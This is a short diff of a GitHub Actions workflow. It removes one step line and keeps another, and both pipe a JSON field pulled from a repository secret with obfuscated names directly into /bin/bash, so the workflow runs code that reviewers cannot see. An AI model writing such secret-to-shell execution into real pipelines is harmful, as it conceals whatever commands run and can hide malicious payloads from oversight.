@@ -20,7 +20,6 @@ jobs:
           kh515: ${{ secrets.kh515 }}
         run: |
           printf '%s' "$kh515" | jq -r .x75 | /bin/bash
-          printf '%s' "$gah71848" | jq -r .wwkpc61 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
